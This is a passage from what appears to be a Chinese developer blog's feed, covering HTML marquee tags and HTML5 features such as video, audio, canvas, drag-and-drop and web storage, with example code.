    &lt;marquee direction=&quot;up&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;这是一个marquee标签，似乎是零几年就存在的一个标签，但是现在好像没听说过&lt;/marquee&gt;
    &lt;marquee direction=&quot;left&quot; scroll=&quot;alternate&quot; loop=&quot;-1&quot; scrollamount=&quot;10&quot;&gt;&lt;img src=&quot;https://ss0.baidu.com/73t1bjeh1BF3odCf/it/u=156557612,1695936325&amp;fm=85&amp;s=695818D27C46B819D23D44D50300C062&quot;&gt;&lt;/marquee&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>那么问题来了，这么酷炫的标签为什么现在没人用了呢？</p>
<p>因为他被W3C标准抛弃了！</p>
<p>主要原因可以看一下参考链接。一句话就是：用归用，标准归标准。</p>
<blockquote>
<p>顺便插个嘴，这玩意儿浏览器支持还挺好的（毕竟那么早的标签了）</p>
</blockquote>
<p>参考链接：</p>
<ul>
<li><a href="http://www.chinablackhat.com/kf/201410/6610.html" target="_blank" rel="external">Marquee为什么不符合WEB标准？</a></li>
<li><a href="http://www.cnblogs.com/zzuIvy/p/marqueeTest_1.html" target="_blank" rel="external">HTML标签marquee实现滚动效果</a></li>
<li><a href="http://www.cnblogs.com/hustskyking/p/marquee-in-javascript.html" target="_blank" rel="external">一个不陌生的JS效果-marquee的代替实现方法</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;h5 id=&quot;腾讯笔试题&quot;&gt;&lt;a href=&quot;#腾讯笔试题&quot; class=&quot;headerlink&quot; title=&quot;腾讯笔试题&quot;&gt;&lt;/a&gt;腾讯笔试题&lt;/h5&gt;&lt;p&gt;顺便吐槽一句……&lt;/p&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="数据类型" scheme="https://jasonyan2015.github.io/tags/%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>HTML5新特性</title>
    <link href="https://jasonyan2015.github.io/2017/04/04/HTML5%E6%96%B0%E7%89%B9%E6%80%A7%E7%AC%94%E8%AE%B0/"/>
    <id>https://jasonyan2015.github.io/2017/04/04/HTML5新特性笔记/</id>
    <published>2017-04-04T07:08:59.194Z</published>
    <updated>2017-04-08T16:23:07.713Z</updated>
    
    <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
<li>用于绘画的 canvas 元素</li>
<li>用于媒介回放的 video 和 audio 元素</li>
<li>对本地离线存储的更好的支持</li>
<li>新的特殊内容元素，比如 article、footer、header、nav、section</li>
<li>新的表单控件，比如 calendar、date、time、email、url、search</li>
</ul>
<a id="more"></a>
<h2 id="video标签"><a href="#video标签" class="headerlink" title="video标签"></a>video标签</h2><pre><code>&lt;video width=&quot;320&quot; height=&quot;240&quot; controls=&quot;controls&quot; autoplay=&quot;autoplay&quot; loop=&quot;loop&quot;&gt;
      &lt;source src=&quot;movie.ogg&quot; type=&quot;video/ogg&quot;&gt;
      &lt;source src=&quot;movie.mp4&quot; type=&quot;video/mp4&quot;&gt;
    Your browser does not support the video tag.
&lt;/video&gt;
</code></pre><ul>
<li>width：定义播放器宽度</li>
<li>height： 设置视频播放器的高度</li>
<li>controls：如果出现该属性，则向用户显示控件，播放按钮，音量，进度条，下载按钮等</li>
<li>autoplay： 如果出现该属性，则视频在就绪后马上播放。</li>
<li>loop：如果出现该属性，则当媒介文件完成播放后再次开始播放</li>
<li>preload：如果出现该属性，则视频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性</li>
<li>src：要播放的视频的 URL，也可以像上例中写在source标签里</li>
</ul>
<p>video 元素允许多个 source 元素。source 元素可以链接不同的视频文件。浏览器将使用第一个可识别的格式。</p>
<p><code>&lt;video&gt;</code> 与<code>&lt;/video&gt;</code> 之间插入的内容是供不支持 video 元素的浏览器显示的：</p>
<h4 id="支持格式"><a href="#支持格式" class="headerlink" title="支持格式"></a>支持格式</h4><table>
<thead>
<tr>
<th>格式</th>
<th>IE</th>
<th>Firefox</th>
<th>Opera</th>
<th>Chrome</th>
<th>Safari</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ogg</td>
<td>No</td>
<td>3.5+</td>
<td>10.5+</td>
<td>5.0+</td>
<td>No</td>
</tr>
<tr>
<td>MPEG 4</td>
<td>9.0+</td>
<td>No</td>
<td>No</td>
<td>5.0+</td>
<td>3.0+</td>
</tr>
<tr>
<td>WebM</td>
<td>No</td>
<td>4.0+</td>
<td>10.6+</td>
<td>6.0+</td>
<td>No</td>
</tr>
</tbody>
</table>
<ul>
<li>Ogg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件</li>
<li>MPEG4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件</li>
<li>WebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件</li>
</ul>
<h4 id="方法，属性和事件"><a href="#方法，属性和事件" class="headerlink" title="方法，属性和事件"></a>方法，属性和事件</h4><table>
<thead>
<tr>
<th>方法</th>
<th>属性</th>
<th>事件</th>
</tr>
</thead>
<tbody>
<tr>
<td>play()</td>
<td>currentSrc</td>
<td>play</td>
</tr>
<tr>
<td>pause()</td>
<td>currentTime</td>
<td>pause</td>
</tr>
<tr>
<td>load()</td>
<td>videoWidth</td>
<td>progress</td>
</tr>
<tr>
<td>canPlayType</td>
<td>videoHeight</td>
<td>error</td>
</tr>
<tr>
<td></td>
<td>duration</td>
<td>timeupdate</td>
</tr>
<tr>
<td></td>
<td>ended</td>
<td>ended</td>
</tr>
<tr>
<td></td>
<td>error</td>
<td>abort</td>
</tr>
<tr>
<td></td>
<td>paused</td>
<td>empty</td>
</tr>
<tr>
<td></td>
<td>muted</td>
<td>emptied</td>
</tr>
<tr>
<td></td>
<td>seeking</td>
<td>waiting</td>
</tr>
<tr>
<td></td>
<td>volume</td>
<td>loadedmetadata</td>
</tr>
<tr>
<td></td>
<td>height</td>
<td></td>
</tr>
<tr>
<td></td>
<td>width</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>在所有属性中，只有 videoWidth 和 videoHeight 属性是立即可用的。在视频的元数据已加载后，其他属性才可用。</p>
</blockquote>
<h2 id="audio标签"><a href="#audio标签" class="headerlink" title="audio标签"></a>audio标签</h2><pre><code>&lt;audio src=&quot;song.ogg&quot; controls=&quot;controls&quot;&gt;
    Your browser does not support the audio tag.
&lt;/audio&gt;
</code></pre><ul>
<li>autoplay：如果出现该属性，则音频在就绪后马上播放。</li>
<li>controls：如果出现该属性，则向用户显示控件，比如播放按钮。</li>
<li>loop：如果出现该属性，则每当音频结束时重新开始播放。</li>
<li>preload：如果出现该属性，则音频在页面加载时进行加载，并预备播放。如果使用 “autoplay”，则忽略该属性。</li>
<li>src：要播放的音频的 URL。</li>
</ul>
<p>audio 元素允许多个 source 元素。source 元素可以链接不同的音频文件。浏览器将使用第一个可识别的格式。</p>
<p><code>&lt;audio&gt;</code> 与 <code>&lt;/audio&gt;</code> 之间插入的内容是供不支持 audio 元素的浏览器显示的。</p>
<h4 id="支持格式-1"><a href="#支持格式-1" class="headerlink" title="支持格式"></a>支持格式</h4><table>
<thead>
<tr>
<th>格式</th>
<th>IE9</th>
<th>Firefox3.5</th>
<th>Opera10.5</th>
<th>Chrome3.0</th>
<th>Safari3.0</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ogg Vorbis</td>
<td></td>
<td>YES</td>
<td>YES</td>
<td>YES</td>
<td></td>
</tr>
<tr>
<td>MP3</td>
<td>YES</td>
<td></td>
<td></td>
<td>YES</td>
<td>YES</td>
</tr>
<tr>
<td>Wav</td>
<td></td>
<td>YES</td>
<td>YES</td>
<td></td>
<td>YES</td>
</tr>
</tbody>
</table>
<h2 id="canvas"><a href="#canvas" class="headerlink" title="canvas"></a>canvas</h2><pre><code>&lt;canvas id=&quot;myCanvas&quot;&gt;&lt;/canvas&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    var canvas=document.getElementById(&apos;myCanvas&apos;);
    var ctx=canvas.getContext(&apos;2d&apos;);
    ctx.fillStyle=&apos;#FF0000&apos;;
    ctx.fillRect(0,0,80,100);
&lt;/script&gt;
</code></pre><h5 id="浏览器支持"><a href="#浏览器支持" class="headerlink" title="浏览器支持"></a>浏览器支持</h5><p>Internet Explorer 8 以及更早的版本不支持 <code>&lt;canvas&gt;</code>标签。其他浏览器不识别但是会使用衬线体来直接显示其内所有内容。</p>
<h5 id="标签定义和用法"><a href="#标签定义和用法" class="headerlink" title="标签定义和用法"></a>标签定义和用法</h5><p><code>&lt;canvas&gt;</code> 标签定义图形，比如图表和其他图像。但是它只提供图形容器，必须使用javascript来绘制图形。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>height</td>
<td>pixels</td>
<td>设置 canvas 的高度。</td>
</tr>
<tr>
<td>width</td>
<td>pixels</td>
<td>设置 canvas 的宽度。</td>
</tr>
</tbody>
</table>
<h4 id="使用javascript绘制"><a href="#使用javascript绘制" class="headerlink" title="使用javascript绘制"></a>使用javascript绘制</h4><p><a href="http://www.w3school.com.cn/tags/html_ref_canvas.asp" target="_blank" rel="external">W3School参考链接</a></p>
<h5 id="颜色、样式和阴影"><a href="#颜色、样式和阴影" class="headerlink" title="颜色、样式和阴影"></a>颜色、样式和阴影</h5><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>fillStyle</td>
<td>设置或返回用于填充绘画的颜色、渐变或模式</td>
</tr>
<tr>
<td>strokeStyle</td>
<td>设置或返回用于笔触的颜色、渐变或模式</td>
</tr>
<tr>
<td>shadowColor</td>
<td>设置或返回用于阴影的颜色</td>
</tr>
<tr>
<td>shadowBlur</td>
<td>设置或返回用于阴影的模糊级别</td>
</tr>
<tr>
<td>shadowOffsetX</td>
<td>设置或返回阴影距形状的水平距离</td>
</tr>
<tr>
<td>shadowOffsetY</td>
<td>设置或返回阴影距形状的垂直距离</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>createLinearGradient()</td>
<td>创建线性渐变（用在画布内容上）</td>
</tr>
<tr>
<td>createPattern()</td>
<td>在指定的方向上重复指定的元素</td>
</tr>
<tr>
<td>createRadialGradient()</td>
<td>创建放射状/环形的渐变（用在画布内容上）</td>
</tr>
<tr>
<td>addColorStop()</td>
<td>规定渐变对象中的颜色和停止位置</td>
</tr>
</tbody>
</table>
<h5 id="线条样式"><a href="#线条样式" class="headerlink" title="线条样式"></a>线条样式</h5><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>lineCap</td>
<td>设置或返回线条的结束端点样式</td>
</tr>
<tr>
<td>lineJoin</td>
<td>设置或返回两条线相交时，所创建的拐角类型</td>
</tr>
<tr>
<td>lineWidth</td>
<td>设置或返回当前的线条宽度</td>
</tr>
<tr>
<td>miterLimit</td>
<td>设置或返回最大斜接长度</td>
</tr>
</tbody>
</table>
<h5 id="矩形"><a href="#矩形" class="headerlink" title="矩形"></a>矩形</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>rect()</td>
<td>创建矩形</td>
</tr>
<tr>
<td>fillRect()</td>
<td>绘制“被填充”的矩形</td>
</tr>
<tr>
<td>strokeRect()</td>
<td>绘制矩形（无填充）</td>
</tr>
<tr>
<td>clearRect()</td>
<td>在给定的矩形内清除指定的像素</td>
</tr>
</tbody>
</table>
<h5 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>fill()</td>
<td>填充当前绘图（路径）</td>
</tr>
<tr>
<td>stroke()</td>
<td>绘制已定义的路径</td>
</tr>
<tr>
<td>beginPath()</td>
<td>起始一条路径，或重置当前路径</td>
</tr>
<tr>
<td>moveTo()</td>
<td>把路径移动到画布中的指定点，不创建线条</td>
</tr>
<tr>
<td>closePath()</td>
<td>创建从当前点回到起始点的路径</td>
</tr>
<tr>
<td>lineTo()</td>
<td>添加一个新点，然后在画布中创建从该点到最后指定点的线条</td>
</tr>
<tr>
<td>clip()</td>
<td>从原始画布剪切任意形状和尺寸的区域</td>
</tr>
<tr>
<td>quadraticCurveTo()</td>
<td>创建二次贝塞尔曲线</td>
</tr>
<tr>
<td>bezierCurveTo()</td>
<td>创建三次方贝塞尔曲线</td>
</tr>
<tr>
<td>arc()</td>
<td>创建弧/曲线（用于创建圆形或部分圆）</td>
</tr>
<tr>
<td>arcTo()</td>
<td>创建两切线之间的弧/曲线</td>
</tr>
<tr>
<td>isPointInPath()</td>
<td>如果指定的点位于当前路径中，则返回 true，否则返回 false</td>
</tr>
</tbody>
</table>
<h5 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>scale()</td>
<td>缩放当前绘图至更大或更小</td>
</tr>
<tr>
<td>rotate()</td>
<td>旋转当前绘图</td>
</tr>
<tr>
<td>translate()</td>
<td>重新映射画布上的 (0,0) 位置</td>
</tr>
<tr>
<td>transform()</td>
<td>替换绘图的当前转换矩阵</td>
</tr>
<tr>
<td>setTransform()</td>
<td>将当前转换重置为单位矩阵。然后运行 transform()</td>
</tr>
</tbody>
</table>
<h5 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h5><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>font</td>
<td>设置或返回文本内容的当前字体属性</td>
</tr>
<tr>
<td>textAlign</td>
<td>设置或返回文本内容的当前对齐方式</td>
</tr>
<tr>
<td>textBaseline</td>
<td>设置或返回在绘制文本时使用的当前文本基线</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>fillText()</td>
<td>在画布上绘制“被填充的”文本</td>
</tr>
<tr>
<td>strokeText()</td>
<td>在画布上绘制文本（无填充）</td>
</tr>
<tr>
<td>measureText()</td>
<td>返回包含指定文本宽度的对象</td>
</tr>
</tbody>
</table>
<h5 id="图像绘制"><a href="#图像绘制" class="headerlink" title="图像绘制"></a>图像绘制</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>drawImage()</td>
<td>向画布上绘制图像、画布或视频</td>
</tr>
</tbody>
</table>
<h5 id="像素操作"><a href="#像素操作" class="headerlink" title="像素操作"></a>像素操作</h5><table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>width</td>
<td>返回 ImageData 对象的宽度</td>
</tr>
<tr>
<td>height</td>
<td>返回 ImageData 对象的高度</td>
</tr>
<tr>
<td>data</td>
<td>返回一个对象，其包含指定的 ImageData 对象的图像数据</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>createImageData()</td>
<td>创建新的、空白的 ImageData 对象</td>
</tr>
<tr>
<td>getImageData()</td>
<td>返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据</td>
</tr>
<tr>
<td>putImageData()</td>
<td>把图像数据（从指定的 ImageData 对象）放回画布上</td>
</tr>
</tbody>
</table>
<p>#####　合成</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>globalAlpha</td>
<td>设置或返回绘图的当前 alpha 或透明值</td>
</tr>
<tr>
<td>globalCompositeOperation</td>
<td>设置或返回新图像如何绘制到已有的图像上</td>
</tr>
</tbody>
</table>
<h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>save()</td>
<td>保存当前环境的状态</td>
</tr>
<tr>
<td>restore()</td>
<td>返回之前保存过的路径状态和属性</td>
</tr>
<tr>
<td>createEvent()</td>
<td></td>
</tr>
<tr>
<td>getContext()</td>
<td></td>
</tr>
<tr>
<td>toDataURL()</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p><strong><code>&lt;canvas&gt;</code> 标记和 SVG 以及 VML 之间的差异</strong><br><code>&lt;canvas&gt;</code>有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。<br>这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。<br>要从同一图形的一个 <code>&lt;canvas&gt;</code> 标记中移除元素，往往需要擦掉绘图重新绘制它。</p>
</blockquote>
<h2 id="拖放"><a href="#拖放" class="headerlink" title="拖放"></a>拖放</h2><pre><code>&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style type=&quot;text/css&quot;&gt;
    #div1, #div2, #div3, #div4{
        float:left; 
        width:100px;
        height:100px;
        margin:10px;
        padding:10px;
        border:1px solid #aaaaaa;
    }
    *{
        transition:all 0.5s;
    }
    #dragDiv{
        background-color: #369;
        width:100px;
        height:100px;
    }
    #mouseLocation{
        clear: both;
        width: 265px;
        margin-left: 10px;
        text-align: center;
    }
    #crossDiv{
        clear: both;
        display: inline-block;
        height: 200px;
        width: 10px;
        background-color: #333;
    }
    #dragElement{
        float: left;
        width: 120px;
        height: 120px;
        background-color: #369;
        margin-left: -99999px;
        opacity: 1;
    }
    #dragElement:click{
        width: 150px;
        height: 150px;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;div id=&quot;div1&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;
    &lt;div id=&quot;dragDiv&quot; draggable=&quot;true&quot; ondragstart=&quot;drag(event)&quot; ondrag=&quot;draging(event)&quot; &gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;div2&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot; ondragleave=&quot;dragLeave(event)&quot;&gt;&lt;/div&gt;
&lt;div id=&quot;mouseLocation&quot;&gt;X坐标：0，Y坐标：0&lt;/div&gt;
&lt;div id=&quot;dragElement&quot;&gt;&lt;/div&gt;
&lt;div id=&quot;div3&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;
&lt;div id=&quot;div4&quot; ondrop=&quot;drop(event)&quot; ondragover=&quot;allowDrop(event)&quot;&gt;&lt;/div&gt;

&lt;script type=&quot;text/javascript&quot;&gt;
    var mouseLocation = document.getElementById(&quot;mouseLocation&quot;);
    var dragElement = document.getElementById(&quot;dragElement&quot;);

    function draging(ev) {
        mouseLocation.innerHTML = &quot;X坐标：&quot; + ev.clientX + &quot;，Y坐标：&quot; + ev.clientY;
    }

    function allowDrop(ev){
        ev.preventDefault();
        mouseLocation.style.backgroundColor = &quot;#333&quot;;
        mouseLocation.style.color = &quot;#fff&quot;;
        ev.dataTransfer.dropEffect = &quot;copy&quot;;
    }

    function dragLeave(ev) {
        mouseLocation.style.backgroundColor = &quot;#fff&quot;;
        mouseLocation.style.color = &quot;#000&quot;;
    }

    function drag(ev){
        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);
        ev.dataTransfer.setDragImage(dragElement, 60, 60);
        ev.dataTransfer.effectAllowed = &quot;copy&quot;;
    }

    function drop(ev) {
        ev.preventDefault();
        var data = ev.dataTransfer.getData(&quot;Text&quot;);
        ev.target.appendChild(document.getElementById(data));
    }
&lt;/script&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>整个过程可解析为如下过程：</p>
<ol>
<li><p><strong>设置元素为可拖放</strong>——draggable 属性</p>
<pre><code>`&lt;img draggable=&quot;true&quot; /&gt;`
</code></pre></li>
<li><p><strong>拖动什么</strong> ——ondragstart 和 setData()<br><br>在上面的例子中，ondragstart 属性调用了一个函数，drag(event)，它规定了被拖动的数据。dataTransfer.setData() 方法设置被拖数据的数据类型和值。</p>
</li>
</ol>
<blockquote>
<p><a href="http://www.tuicool.com/articles/j6Zbam" target="_blank" rel="external">参考链接</a></p>
</blockquote>
<pre><code>    function drag(ev) {
        ev.dataTransfer.setData(&quot;Text&quot;,ev.target.id);
    }

在这个例子中，数据类型是 &quot;Text&quot;，值是可拖动元素的 id (&quot;drag1&quot;)。
</code></pre><ol>
<li><p><strong>拖动过程中</strong>——ondrag<br><br>拖动过程中，在被拖拉的节点上持续触发。</p>
</li>
<li><p><strong>放到何处</strong> ——ondragover和getData()<br><br>ondragover 事件规定在何处放置被拖动的数据。<br>默认地，无法将数据/元素放置到其他元素中。如果需要设置允许放置，我们必须阻止对元素的默认处理方式。<br>这要通过调用 ondragover 事件的 event.preventDefault() 方法。</p>
<pre><code>event.preventDefault()
</code></pre></li>
<li><p><strong>进行放置</strong> ——ondrop<br><br>当放置被拖数据时，会发生 drop 事件。在上面的例子中，ondrop 属性调用了一个函数，drop(event)。</p>
<pre><code>function drop(ev) {
    ev.preventDefault();
    var data=ev.dataTransfer.getData(&quot;Text&quot;);
    ev.target.appendChild(document.getElementById(data));
}
</code></pre></li>
</ol>
<blockquote>
<p>代码解释：</p>
<ul>
<li>调用 preventDefault() 来避免浏览器对数据的默认处理（drop 事件的默认行为是以链接形式打开）</li>
<li>通过 dataTransfer.getData(“Text”) 方法获得被拖的数据。该方法将返回在 setData() 方法中设置为相同类型的任何数据。</li>
<li>被拖数据是被拖元素的 id (“drag1”)</li>
<li>把被拖元素追加到放置元素（目标元素）中</li>
</ul>
</blockquote>
<p>其他事件和方法：</p>
<ul>
<li><strong>dragend事件</strong>：<br>拖拉结束时（释放鼠标键或按下escape键）在被拖拉的节点上触发，该事件的target属性是被拖拉的节点。它与dragStart事件，在同一个节点上触发。不管拖拉是否跨窗口，或者中途被取消，dragend事件总是会触发的。</li>
<li><strong>dragenter事件</strong>：拖拉进入当前节点时，在当前节点上触发，该事件的target属性是当前节点。通常应该在这个事件的监听函数中，指定是否允许在当前节点放下（drop）拖拉的数据。如果当前节点没有该事件的监听函数，或者监听函数不执行任何操作，就意味着不允许在当前节点放下数据。在视觉上显示拖拉进入当前节点，也是在这个事件的监听函数中设置。</li>
<li><strong>dragover事件</strong>：拖拉到当前节点上方时，在当前节点上持续触发，该事件的target属性是当前节点。该事件与dragenter事件基本类似，默认会重置当前的拖拉事件的效果（DataTransfer对象的dropEffect属性）为none，即不允许放下被拖拉的节点，所以如果允许在当前节点drop数据，通常会使用preventDefault方法，取消重置拖拉效果为none。</li>
<li><strong>event.dataTransfer.setDragImage(element,x,y)方法</strong>：设置拖放操作的自定义图标。其中element设置自定义图标，x设置图标与鼠标在水平方向上的距离，y设置图标与鼠标在垂直方向上的距离。</li>
</ul>
<p>####H5拖拽常用功能</p>
<blockquote>
<p>HTML5文件拖拽预览Demo</p>
</blockquote>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
 &lt;head&gt; 
  &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; 
  &lt;title&gt;HTML5文件拖拽预览Demo&lt;/title&gt; 
  &lt;style type=&quot;text/css&quot;&gt;
      h1 {
        padding: 0px;
        margin: 0px;
    }
    div#show {
        border: 1px solid #ccc;
        width: 400px;
        height: 300px;
        display: -moz-box;
        display: -webkit-box;
        -moz-box-align: center;
        -webkit-box-align: center;
        -moz-box-pack: center;
        -webkit-box-pack: center;
        resize: both;
        overflow: auto;
    }
    div[id^=show]:hover {
        border: 1px solid #333;
    }
    div#main {
        width: 100%;
    }
    div#successLabel {
        color: Red;
    }
    div#content {
        display: none;
    }    
&lt;/style&gt; 
  &lt;script type=&quot;text/javascript&quot;&gt;
      function init() {
        var dest = document.getElementById(&quot;show&quot;);
        dest.addEventListener(&quot;dragover&quot;,
            function(ev) {
                ev.stopPropagation();
                ev.preventDefault();
            },
        false);
        dest.addEventListener(&quot;dragend&quot;,
            function(ev) {
                ev.stopPropagation();
                ev.preventDefault();
            },
        false);
        dest.addEventListener(&quot;drop&quot;,
            function(ev) {
                ev.stopPropagation();
                ev.preventDefault();
                console.log(ev.dataTransfer) var file = ev.dataTransfer.files[0];
                var reader = new FileReader();
                if (file.type.substr(0, 5) == &quot;image&quot;) {
                    reader.onload = function(event) {
                        dest.style.background = &apos;url(&apos; + event.target.result + &apos;) no-repeat center&apos;;
                        dest.innerHTML = &quot;&quot;;
                    };
                    reader.readAsDataURL(file);
                } else if (file.type.substr(0, 4) == &quot;text&quot;) {
                    reader.readAsText(file);
                    reader.onload = function(f) {
                        dest.innerHTML = &quot;&lt;pre&gt;&quot; + this.result + &quot;&lt;/pre&gt;&quot;;
                        dest.style.background = &quot;white&quot;;
                    }
                } else {
                    dest.innerHTML = &quot;暂不支持此类文件的预览&quot;;
                    dest.style.background = &quot;white&quot;;
                }
            },
           false);
    } 
    //设置页面属性，不执行默认处理（拒绝被拖放）
    // document.ondragover = function(e) {
    //     e.preventDefault();
    // };
    // document.ondrop = function(e) {
    //     e.preventDefault();
    // }
    // window.onload = init;

  &lt;/script&gt;
 &lt;/head&gt;
 &lt;body&gt; 
  &lt;h1&gt;HTML5文件拖拽预览Demo&lt;/h1&gt; 
  &lt;div id=&quot;show&quot;&gt;
    文件预览区，仅限图片和txt文件 
  &lt;/div&gt;
 &lt;/body&gt;
&lt;/html&gt;
</code></pre><h2 id="Web存储"><a href="#Web存储" class="headerlink" title="Web存储"></a>Web存储</h2><p>HTML5 提供了两种在客户端存储数据的新方法：</p>
<ul>
<li>localStorage - 没有时间限制的数据存储</li>
<li>sessionStorage - 针对一个 session 的数据存储</li>
</ul>
<p>之前，这些都是由 cookie 完成的。但是 cookie 不适合大量数据的存储，因为它们由每个对服务器的请求来传递，这使得 cookie 速度很慢而且效率也不高。</p>
<p>在 HTML5 中，数据不是由每个服务器请求传递的，而是只有在请求时使用数据。它使在不影响网站性能的情况下存储大量数据成为可能。<br>对于不同的网站，数据存储于不同的区域，并且一个网站只能访问其自身的数据。<br>HTML5 使用 JavaScript 来存储和访问数据。</p>
<h4 id="localStorage方法"><a href="#localStorage方法" class="headerlink" title="localStorage方法"></a>localStorage方法</h4><p>localStorage 方法存储的数据没有时间限制。第二天、第二周或下一年之后，数据依然可用。</p>
<p>这个例子创建并访问了 localStorage：</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    localStorage.lastname=&quot;Smith&quot;;
    document.write(localStorage.lastname);
&lt;/script&gt;
</code></pre><p>下面的例子对用户访问页面的次数进行计数：</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    if (localStorage.pagecount) {
          localStorage.pagecount=Number(localStorage.pagecount) +1;
    }
    else {
         localStorage.pagecount=1;
    }
    document.write(&quot;Visits &quot;+ localStorage.pagecount + &quot; time(s).&quot;);
&lt;/script&gt;
</code></pre><h4 id="sessionStorage方法"><a href="#sessionStorage方法" class="headerlink" title="sessionStorage方法"></a>sessionStorage方法</h4><p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p>
<p>创建并访问一个 sessionStorage：</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    sessionStorage.lastname=&quot;Smith&quot;;
    document.write(sessionStorage.lastname);
&lt;/script&gt;
</code></pre><p>应用——统计用户在当前 session 中访问页面的次数进行计数：</p>
<pre><code>&lt;script type=&quot;text/javascript&quot;&gt;
    if (sessionStorage.pagecount) {
          sessionStorage.pagecount=Number(sessionStorage.pagecount) +1;
    }
    else {
         sessionStorage.pagecount=1;
    }
    document.write(&quot;Visits &quot;+sessionStorage.pagecount+&quot; time(s) this session.&quot;);
&lt;/script&gt;
</code></pre><h2 id="H5标签"><a href="#H5标签" class="headerlink" title="H5标签"></a>H5标签</h2><h3 id="nav标签"><a href="#nav标签" class="headerlink" title="nav标签"></a>nav标签</h3><pre><code>&lt;nav&gt;
    &lt;a href=&quot;index.asp&quot;&gt;Home&lt;/a&gt;
    &lt;a href=&quot;html5_meter.asp&quot;&gt;Previous&lt;/a&gt;
    &lt;a href=&quot;html5_noscript.asp&quot;&gt;Next&lt;/a&gt;
&lt;/nav&gt;
</code></pre><h5 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;nav&gt;</code>定义导航链接的部分。</p>
<blockquote>
<p>如果文档中有“前后”按钮，则应该把它放到 <code>&lt;nav&gt;</code> 元素中。</p>
</blockquote>
<h3 id="section标签"><a href="#section标签" class="headerlink" title="section标签"></a>section标签</h3><pre><code>&lt;section&gt;
  &lt;h1&gt;PRC&lt;/h1&gt;
  &lt;p&gt;The People&apos;s Republic of China was born in 1949...&lt;/p&gt;
&lt;/section&gt;
</code></pre><h5 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h5><p><code>&lt;section&gt;</code> 标签定义文档中的节（section、区段）。比如章节、页眉、页脚或文档中的其他部分。</p>
<h3 id="header标签"><a href="#header标签" class="headerlink" title="header标签"></a>header标签</h3><pre><code>&lt;header&gt;
